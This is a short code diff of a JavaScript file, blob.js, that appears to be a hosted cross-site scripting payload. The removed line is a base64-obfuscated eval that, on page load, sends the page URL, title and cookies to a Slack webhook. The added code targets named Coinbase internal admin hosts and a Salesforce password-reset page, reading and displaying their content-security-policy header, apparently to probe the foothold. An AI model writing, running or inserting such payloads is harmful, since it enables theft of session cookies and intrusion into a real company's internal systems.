@@ -1,2 +1,7 @@
 /// blob.js
-eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsZnVuY3Rpb24oKXtmZXRjaCgnaHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDA4SzAyUlVWMjgvQjA4TTBWOEo0MU0vQ0J0RHlkVjlNT3ljSjhZOUEwbUFOTmJIJyx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOnsnY29udGVudC10eXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe3RleHQ6J0kgd2FzIGxvYWRlZCBvbiBgJyt3aW5kb3cubG9jYXRpb24uaHJlZisnYCAtIChgJytkb2N1bWVudC50aXRsZSsnYCkgLSAoYCcrZG9jdW1lbnQuY29va2llKydgKS4nfSksbW9kZTonbm8tY29ycyd9KTt9KTs='));
+document.addEventListener('DOMContentLoaded', async function () {
+    if(window.location.hostname == 'admin.cbhq.net' || window.location.hostname == 'control-center.coinbase-corp.com' || window.location.href == 'https://coinbase.my.salesforce.com/secur/forgotpassword.jsp?locale=us') {
+        const response = await fetch('/');
+        prompt('', response.headers.get('content-security-policy'));
+    }
+});
